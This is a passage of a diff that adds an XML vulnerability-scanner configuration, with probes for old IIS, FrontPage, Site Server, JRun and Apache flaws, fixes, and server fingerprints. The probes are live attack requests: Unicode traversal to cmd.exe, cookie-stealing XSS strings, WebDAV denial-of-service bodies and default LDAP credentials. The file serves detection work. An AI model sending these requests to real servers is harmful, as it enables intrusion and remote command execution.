+    <URL>http://www.microsoft.com/technet/security/bulletin/ms00-006.asp</URL>
+    <fix>Patch It</fix>
+  </scan>
+  <scan name='Site Server findserver w/LDAP anon user' id='71'>
+    <send>SiteServer/admin/findvserver.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i5/d69.htm</URL>
+    <fix>Remove Pages</fix>
+    <username>LDAP_Anonymous</username>
+    <password>LdapPassword_1</password>
+  </scan>
+  <scan name='Site Server driver w/LDAP anon user' id='72'>
+    <send>SiteServer/Admin/commerce/foundation/driver.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i5/d69.htm</URL>
+    <fix>Remove Pages</fix>
+    <username>LDAP_Anonymous</username>
+    <password>LdapPassword_1</password>
+  </scan>
+  <scan name='Site Server DSN w/LDAP anon user' id='73'>
+    <send>SiteServer/Admin/commerce/foundation/DSN.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i5/d69.htm</URL>
+    <fix>Remove Pages</fix>
+    <username>LDAP_Anonymous</username>
+    <password>LdapPassword_1</password>
+  </scan>
+  <scan name='Site Server GroupManager w/LDAP anon user' id='74'>
+    <send>Admin/knowledge/dsmgr/users/GroupManager.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i5/d69.htm</URL>
+    <fix>Remove Pages</fix>
+    <username>LDAP_Anonymous</username>
+    <password>LdapPassword_1</password>
+  </scan>
+  <scan name='Site Server UserManager w/LDAP anon user' id='75'>
+    <send>Admin/knowledge/dsmgr/users/UserManager.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i5/d69.htm</URL>
+    <fix>Remove Pages</fix>
+    <username>LDAP_Anonymous</username>
+    <password>LdapPassword_1</password>
+  </scan>
+  <scan name='Site Server dsmgr w/LDAP anon user' id='76'>
+    <send>SiteServer/Admin/knowledge/dsmgr/default.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i5/d69.htm</URL>
+    <fix>Remove Pages</fix>
+    <username>LDAP_Anonymous</username>
+    <password>LdapPassword_1</password>
+  </scan>
+  <scan name='Site Server autoconfig w/LDAP anon user' id='77'>
+    <send>_mem_bin/autoconfig.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i5/d69.htm</URL>
+    <fix>Remove Pages</fix>
+    <username>LDAP_Anonymous</username>
+    <password>LdapPassword_1</password>
+  </scan>
+  <scan name='Site Server formslogin w/LDAP anon user' id='78'>
+    <send>_mem_bin/formslogin.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i5/d69.htm</URL>
+    <fix>Remove Pages</fix>
+    <username>LDAP_Anonymous</username>
+    <password>LdapPassword_1</password>
+  </scan>
+  <scan name='Site Server Publishing Users w/LDAP anon user' id='79'>
+    <send>Sites/Publishing/Users/</send>
+    <version>Microsoft-IIS</version>
+    <method>PUT</method>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i5/d69.htm</URL>
+    <fix>Remove Pages</fix>
+    <username>LDAP_Anonymous</username>
+    <password>LdapPassword_1</password>
+  </scan>
+  <scan name='CSS 404 Hole' id='80'>
+    <send>GET /unspecifically-not-here HTTP/1.0</send>
+    <expect>escape\(urlresult\)</expect>
+    <version>Microsoft-IIS</version>
+    <method>RAW</method>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS02-018.asp</URL>
+    <fix>Install Rollup Patch from MS02-018</fix>
+  </scan>
+  <scan name='/_vti_bin/shtml.dll path disclosure' id='81'>
+    <send>/_vti_bin/shtml.dll/asdfghjkl</send>
+    <expect>:\\</expect>
+    <version>Microsoft-IIS</version>
+    <URL>http://online.securityfocus.com/bid/1174/discussion/</URL>
+    <fix>Remove FrontPage or File</fix>
+  </scan>
+  <scan name='/_vti_bin/shtml.exe path disclosure' id='82'>
+    <send>/_vti_bin/shtml.exe/qwertyuiop</send>
+    <expect>:\\</expect>
+    <version>Microsoft-IIS</version>
+    <URL>http://online.securityfocus.com/bid/1174/discussion/</URL>
+    <fix>Remove FrontPage or File</fix>
+  </scan>
+  <scan name='fp30reg.dll CSS' id='83'>
+    <send>/_vti_bin/_vti_aut/fp30reg.dll</send>
+    <version>Microsoft-IIS</version>
+    <fix>Delete file and/or uninstall FrontPage</fix>
+  </scan>
+  <scan name='C:\ Shared' id='96'>
+    <send>/c/winnt/system32/cmd.exe?/c+dir</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <fix>Don't share C:\</fix>
+  </scan>
+  <scan name='Multiple PHP Remote Vulns  &lt; 4.2.2' id='84'>
+    <send>/</send>
+    <version>PHP</version>
+    <versionID>4.2.2</versionID>
+  </scan>
+  <scan name='JRUN WEB-INF Access' id='85'>
+    <send>WEB-INF/web.xml</send>
+    <expect>web-app</expect>
+    <version>JRun</version>
+    <level>HIGH</level>
+    <URL>http://www.foundstone.com/knowledge/randd-advisories-display.html?id=231</URL>
+    <fix>Follow the recommendations given in Allaire Security Bulletin ASB00-27, available at: http://www.allaire.com/security/</fix>
+    <description>A severe security flaw exists with Allaire's JRun 3.0 allowing an attacker to access WEB-INF directories on the JRun 3.0 server. The WEB-INF directory tree contains web application classes, pre-compiled JSP files, server side libraries, session information and files such as web.xml and webapp.properties.</description>
+  </scan>
+  <scan name='A1Stats a1disp.cgi' id='86'>
+    <send>/cgi-bin/a1stats/a1disp.cgi</send>
+    <expect>a1disp.cgi\?</expect>
+    <URL>http://online.securityfocus.com/archive/1/183028/2001-05-05/2001-05-11/0</URL>
+  </scan>
+  <scan name='_vti_bin/fpcount.exe Buffer Overflow' id='87'>
+    <send>_vti_bin/fpcount.exe?Page=default.asp|Image=3</send>
+    <contenttype>image</contenttype>
+    <version>Microsoft-IIS</version>
+    <fix>Uninstall MSFP, delete /_vti_bin/fpcount.exe and/or remove virtual mapping for _vti_bin</fix>
+    <level>Medium</level>
+  </scan>
+  <scan name='webhits.dll arbitrary file access' id='88'>
+    <description>Webhits.dll is part of the Microsoft Index Server package distributed with Windows NT 4.0 and 2000. A problem with the package could allow remote users to gain access to source code of ASP docuements.</description>
+    <send>qwertypoiu.htw</send>
+    <expect>QUERY_STRING</expect>
+    <version>Microsoft-IIS</version>
+    <URL>http://online.securityfocus.com/bid/2269</URL>
+    <level>HIGH</level>
+    <fix>Remove mapping for .htw</fix>
+    <md5>86e74983ccd646afa427918c324492b1</md5>
+  </scan>
+  <scan name='/_vti_bin/shtml.dll file access' id='89'>
+    <send>_vti_bin/shtml.dll</send>
+    <expect>FrontPage Error</expect>
+    <version>Microsoft-IIS</version>
+    <fix>Uninstall MSFP, delete /_vti_bin/shtml.dll and/or remove virtual mapping for _vti_bin</fix>
+  </scan>
+  <scan name='.printer Buffer Overflow' id='90'>
+    <send>GET /qwertypoiu.printer HTTP/1.0</send>
+    <expect>500 13</expect>
+    <method>RAW</method>
+    <version>Microsoft-IIS</version>
+    <fix>Remove mapping for .printer</fix>
+    <level>HIGH</level>
+    <CVE>CVE-2001-0241</CVE>
+  </scan>
+  <scan name='Possible mod_ssl buffer overflow &lt; 2.8.10' id='94'>
+    <version>mod_ssl</version>
+    <versionID>2.8.10</versionID>
+    <fix>Upgrade or Patch mod_ssl</fix>
+    <level>HIGH</level>
+  </scan>
+  <scan name='Simple XSS' id='99'>
+    <send>%3Cscript%3Ealert(document.cookie)%3C/script%3E</send>
+    <expect>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</expect>
+    <level>Medium</level>
+    <contenttype>text/html</contenttype>
+    <URL>http://www.cert.org/advisories/CA-2000-02.html</URL>
+  </scan>
+  <scan name='fp30reg.dll Buffer Overflow' id='95'>
+    <send>GET /_vti_bin/_vti_aut/fp30reg.dll?1234=X HTTP/1.0</send>
+    <expect>501</expect>
+    <method>RAW</method>
+    <version>Microsoft-IIS</version>
+    <fix>Uninstall MSFP, delete /_vti_bin/fp30reg.dll and/or remove virtual mapping for _vti_bin</fix>
+    <CVE>CAN-2001-0341</CVE>
+  </scan>
+  <scan name='shtml XSS' id='98'>
+    <send>%3Cscript%3Ealert(document.cookie)%3C/script%3E.shtml</send>
+    <expect>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</expect>
+    <level>Medium</level>
+    <contenttype>text/html</contenttype>
+    <URL>http://www.guninski.com/iis50shtml.html</URL>
+    <fix>Remove .shtml mapping, delete shtml.dll and patch</fix>
+  </scan>
+  <scan name='Apache chunks vulnerability' id='91'>
+    <send>GET /checkapache.html HTTP/1.0
+Transfer-Encoding: chunked
+
+999999999;
+a
+0</send>
+    <expect>NULL</expect>
+    <method>RAW</method>
+    <version>Apache</version>
+    <fix>Update and/or Patch Apache</fix>
+    <CVE>CAN-2002-0839</CVE>
+    <URL>http://online.securityfocus.com/bid/5033</URL>
+  </scan>
+  <scan name='WebDAV DoS on SEARCH' id='100'>
+    <description>It is possible to remotely restart all IIS related service using specially crafted request.  It is also possible to force IIS to consume memory which it does not free. Possible Buffer Overflow</description>
+    <method>RAW</method>
+    <send>SEARCH / HTTP/1.1
+Host: %HOST%
+Content-Type: text/xml
+Content-Length: 133
+
+&lt;?xml version="1.0"?&gt;
+&lt;g:searchrequest xmlns:g="DAV:"&gt;
+&lt;g:sql&gt;
+Select "DAV:displayname" from scope()
+&lt;/g:sql&gt;
+&lt;/g:searchrequest&gt;
+    </send>
+    <expect>HTTP/1.1 207</expect>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.guninski.com/iissearch.html</URL>
+    <fix>Disable WebDav extensions</fix>
+  </scan>
+  <scan name='WebDAV DoS on PROPFIND' id='101'>
+    <description>It is possible to remotely restart all IIS related service using specially crafted request.  It is also possible to force IIS to consume memory which it does not free. Possible Buffer Overflow</description>
+    <method>RAW</method>
+    <send>PROPFIND / HTTP/1.1
+Host: %HOST%
+Content-Type: text/xml
+Content-Length: 110
+
+&lt;?xml version="1.0"?&gt;
+&lt;a:propfind xmlns:a="DAV:"&gt;
+ &lt;a:prop&gt;
+  &lt;a:displayname:/&gt;
+ &lt;/a:prop&gt;
+&lt;/a:propfind&gt;
+    </send>
+    <expect>D:href</expect>
+    <URL>http://www.guninski.com/iispropover.html</URL>
+    <fix>Disable WebDav extensions and PROPFIND</fix>
+    <version>Microsoft-IIS</version>
+  </scan>
+  <scan name='JSP 404 XSS' id='102'>
+    <send>unspecific.jsp%3Cscript%3Ealert(document.cookie)%3C/script%3E</send>
+    <expect>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</expect>
+    <level>Medium</level>
+    <contenttype>text/html</contenttype>
+    <URL>http://www.cert.org/advisories/CA-2000-02.html</URL>
+  </scan>
+  <scan name='Commented 404 XSS' id='103'>
+    <send>--&gt;%3Cscript%3Ealert(document.cookie)%3C/script%3E</send>
+    <expect>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</expect>
+    <level>Medium</level>
+    <contenttype>text/html</contenttype>
+    <URL>http://www.cert.org/advisories/CA-2000-02.html</URL>
+  </scan>
+  <scan name='AdSamples site.csc' id='104'>
+    <send>/adsamples/config/site.csc</send>
+    <version>Microsoft-IIS</version>
+  </scan>
+  <scan name='Site Server 3 XSS Knowledge' id='105'>
+    <send>SiteServer/Knowledge/Default.asp?ctr="%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</send>
+    <expect>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</expect>
+    <version>Microsoft-IIS</version>
+    <level>Medium</level>
+    <contenttype>text/html</contenttype>
+    <URL>http://online.securityfocus.com/bid/3999</URL>
+  </scan>
+  <scan name='Site Server 3 XSS _mem_bin' id='106'>
+    <send>/_mem_bin/formslogin.asp?"%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</send>
+    <expect>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</expect>
+    <level>Medium</level>
+    <version>Microsoft-IIS</version>
+    <contenttype>text/html</contenttype>
+    <URL>http://online.securityfocus.com/bid/3999</URL>
+    <fix>Uninstall SiteServer or Delete problem files</fix>
+  </scan>
+  <scan name='Oracle Configuration' id='107'>
+    <send>http://63.250.209.116/pls/simpledad/admin_/gateway.htm</send>
+    <expect>Gateway Configuration Menu</expect>
+    <description>These admin menus should only be accessable with username and password.  </description>
+  </scan>
+  <scan name='printenv enabled' id='108'>
+    <send>/cgi-bin/printenv</send>
+    <level>Medium</level>
+    <expect>QUERY_STRING</expect>
+    <contenttype>text/plain</contenttype>
+    <fix>Delete printenv</fix>
+  </scan>
+  <scan name='.HTR Mapping' id='109'>
+    <send>/unspecific.htr</send>
+    <level>Medium</level>
+    <expect>The requested file could not be found.</expect>
+    <version>Microsoft-IIS</version>
+    <contenttype>text/plain</contenttype>
+    <description>At least one remote vulnerability has been discovered for the .HTR filter. This is detailed in Microsoft Advisory MS02-018, and gives remote SYSTEM level access to the web server.
+
+It is recommended that even if you have patched this vulnerability that you unmap the .HTR extension, and any other unused ISAPI extensions if they are not required for the operation of your site.</description>
+    <fix>Unmap the .HTR extension</fix>
+  </scan>
+  <scan name='UniCode Exploit from /iisadmpwd..%255c../' id='110'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>iisadmpwd/..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir+c:\\</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /exchange..%255c../' id='111'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>exchange/..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir+c:\\</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /adsamples..%255c../' id='112'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>adsamples/..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir+c:\\</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /_vti_cnf..%255c../' id='113'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>_vti_cnf/..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir+c:\\</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /_mem_bin..%255c../' id='114'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>_mem_bin/..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir+c:\\</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /samples..%255c../' id='115'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>samples/..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir+c:\\</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='Vulnerable Helix &lt; 9.0.2.768' id='116'>
+    <description>Vulnerabilities in earlier versions of Apache.</description>
+    <version>RealServer</version>
+    <versionID>9.0.2.794</versionID>
+    <URL>http://www.service.real.com/help/faq/security/bufferoverrun12192002.html</URL>
+    <fix>Patch/Upgrade</fix>
+  </scan>
+  <scan name='CONNECT Proxy Scan' id='117'>
+    <method>RAW</method>
+    <send>CONNECT mail.unspecific.com:25 HTTP/1.0</send>
+    <expect>200 Connection</expect>
+  </scan>
+  <scan name='XST (TRACE Enabled)' id='119'>
+    <method>TRACE</method>
+    <send>unspecific</send>
+    <expect>TRACE /</expect>
+    <contenttype>message/http</contenttype>
+  </scan>
+  <!-- scan name='Embeded XSS' id='118'>
+    <send>%22,alert(document.cookie),%22</send>
+    <expect>",alert(document.cookie),"</expect>
+    <level>Medium</level>
+    <contenttype>text/html</contenttype>
+    <URL>http://online.securityfocus.com/bid/3999</URL>
+  </scan -->
+<!--
+  fingerprint entries are used to try and guess the type of web server if it
+  has been removed from the Server: header field. 
+  <order> </order>
+    The order of the fields returned when sending a OPTIONS request.
+
+  Everything from here down are fields chosen to help identify the version
+  Each field would be compaired for both content as well as order.
+  <Allow> </Allow>
+  <Public> </Public>
+  <Cache-Control> </Cache-Control>
+  <MIME-Version> </MIME-Version>
+-->
+  <fingerprint name='Microsoft-IIS/5.0'>
+    <order>Server, Date, MS-Author-Via, Content-Length, Accept-Ranges, DASL, DAV, Public, Allow, Cache-Control</order>
+    <Allow>OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK</Allow>
+    <Public>OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</Public>
+    <Cache-Control>private</Cache-Control>
+  </fingerprint>
+  <fingerprint name='Microsoft-IIS/5.1'>
+    <order>Server, Date, MS-Author-Via, Content-Length, Accept-Ranges, DASL, DAV, Public, Allow, Cache-Control</order>
+    <Public>OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</Public>
+    <Allow>OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK</Allow>
+    <Cache-Control>private</Cache-Control>
+  </fingerprint>
+  <fingerprint name='Microsoft-IIS/4.0'>
+    <order>Server, Date, Public, Allow, Content-Length</order>
+    <Public>OPTIONS, TRACE, GET, HEAD, POST, PUT, DELETE</Public>
+    <Allow>OPTIONS, TRACE, GET, HEAD</Allow>
+  </fingerprint>
+  <fingerprint name='Microsoft-IIS/4.0 w/NTLM Password'>
+    <response>HTTP/1.1 401 Access Denied</response>
+    <order>WWW-Authenticate, Content-Length, Content-Type</order>
+    <WWW-Authenticate>NTLM</WWW-Authenticate>
+  </fingerprint>
+  <fingerprint name='Apache/1.3 Redirect'>
+    <response>HTTP/1.1 302 Found</response>
+    <order>Date, Location, Connection, Content-Type</order>
+  </fingerprint>
+  <fingerprint name='Apache/1.3'>
+    <order>Date, Content-Length, Allow, Connection</order>
+    <Allow>GET, HEAD, OPTIONS, TRACE</Allow>
+  </fingerprint>
+  <fingerprint name='Apache/1.3 w/ Custom 404'>
+    <order>Date, Cache-Control, Pragma, Expires, Connection, Content-Type</order>
+  </fingerprint>
+  <fingerprint name='Apache/1.3 w/ WebDAV'>
+    <order>Date, Content-Length, Allow, Connection</order>
+    <Allow>GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, TRACE</Allow>
+  </fingerprint>
+  <fingerprint name='Apache/2.0'>
+    <order>Date, Vary, Allow, Content-Length, Connection, Content-Type, Content-Language, Expires</order>
+    <Allow>GET,HEAD,POST,OPTIONS,TRACE</Allow>
+  </fingerprint>
+  <fingerprint name='NaviServer/2.0 AOLserver/2.3.3'>
+    <order>Allow, MIME-Version, Date, Server</order>
+    <Allow>OPTIONS, GET, HEAD, PUT, DELETE, LOCK, UNLOCK</Allow>
+    <MIME-Version>1.0</MIME-Version>
+  </fingerprint>
+  <fingerprint name='Netscape-Enterprise/4.1'>
+    <order>Server, Date, Content-type, Allow, Content-length, Connection</order>
+    <Allow>HEAD, GET</Allow>
+  </fingerprint>
+  <fingerprint name='Apache Tomcat/4.0.3'>
+    <Allow>GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS</Allow>
+  </fingerprint>
+  <fingerprint name='Apache/'>
+    <Allow>GET, HEAD, POST, TRACE, OPTIONS</Allow>
+  </fingerprint>
+  <fingerprint name='RealServer/9.0'>
+    <order>CSeq, Date, Server, Public, RealChallenge1, StatsMask</order>
+    <Public>OPTIONS, DESCRIBE, ANNOUNCE, PLAY, SETUP, GET_PARAMETER, SET_PARAMETER, TEARDOWN</Public>
+  </fingerprint>
+  <fingerprint name='cisco-IOS HTTP-server/1.0'>
+    <response>HTTP/1.0 501 Not Implemented</response>
+    <order>Date, Content-type, Expires</order>
+  </fingerprint>
+  <fingerprint name='Lexmark MarkNet S Printer'>
+    <response>HTTP/1.0 405 Method Not Allowed</response>
+    <order>Allow</order>
+    <Allow>Get, Post</Allow>
+  </fingerprint>
+  <fingerprint name='Hewlett Packard Printer'>
+    <response>HTTP/1.0 501 Not Implemented</response>
+    <order>Server, Content-Type</order>
+  </fingerprint>
+</conf>
